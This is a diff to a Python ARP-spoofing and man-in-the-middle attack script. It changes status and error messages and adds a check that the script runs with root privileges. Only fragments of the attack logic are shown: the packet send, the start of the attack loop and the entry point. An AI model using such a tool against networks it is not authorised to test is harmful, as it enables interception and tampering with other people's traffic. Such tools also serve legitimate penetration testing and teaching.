@@ -110,7 +110,7 @@ def spoof(target_ip, spoof_ip, args_status):
         PACKET = generate_packet(target_ip, target_mac, spoof_ip)
         sp.send(PACKET, verbose=False)
     else:
-        print('[-] Error while spoofing the target ' + target_ip)
+        print('[-] Error while spoofing target: ' + target_ip)
 
 
 def mitm(target_ip, spoof_ip, args_status):
@@ -124,7 +124,7 @@ def mitm(target_ip, spoof_ip, args_status):
     Returns:
         None
     '''
-    print(BRIGHT_YELLOW + '[+] Launching MITM ARP Attack....')
+    print(BRIGHT_YELLOW + f'[+] Launching MITM ARP Attack on {target_ip}....')
     packets_sent = 0
     is_attacking = True
     while is_attacking:
@@ -223,5 +223,10 @@ def run_spoofer(target_ip, spoof_ip, perform_mitm):
 
 
 if __name__ == '__main__':
-    TARGET_IP, SPOOF_IP, MITM = get_args()
-    run_spoofer(TARGET_IP, SPOOF_IP, MITM)
+    from os import getuid
+    if getuid() != 0:
+        raise SystemExit(BRIGHT_RED + '[!] Error: Permission Denied. Administrator privileges required.')
+    else:
+        print(BRIGHT_WHITE + '[+] Administrator Privileges Confirmed.')
+        TARGET_IP, SPOOF_IP, MITM = get_args()
+        run_spoofer(TARGET_IP, SPOOF_IP, MITM)
